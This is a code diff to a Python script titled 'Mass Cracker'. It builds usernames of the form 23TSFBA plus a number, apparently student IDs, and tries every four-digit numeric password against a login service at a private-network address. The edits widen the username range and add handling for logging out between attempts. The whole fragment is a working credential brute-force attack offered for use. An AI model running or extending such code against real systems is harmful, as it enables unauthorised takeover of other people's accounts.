@@ -3,7 +3,7 @@ import json
 
 base_url = 'http://10.201.21.1'
 usernames = []
-for i in range(0,100):
+for i in range(646,1000):
     usernames.append("23TSFBA"+f'{i:03}')
 
 def logged_in():
@@ -44,9 +44,20 @@ def load_passwords_data():
 
 print("Welcome to Mass Cracker!")
 
+if logged_in(): 
+    print("you are logged in!")
+    usr_input = input("Do you want to logout and run the script? type y for yes and n for no:\n")
+    if usr_input.lower()=="y" or usr_input.lower()=="yes":
+        logout()
+    else:
+        exit
+
 # Loop over each username
 for username in usernames:
-    logout()
+    # logout()
+    while logged_in():
+        print("Logging out")
+        logout()
     print(f"Finding password for: {username}\n\n")
     # Loop over the range of passwords
     for password in range(0, 10000):
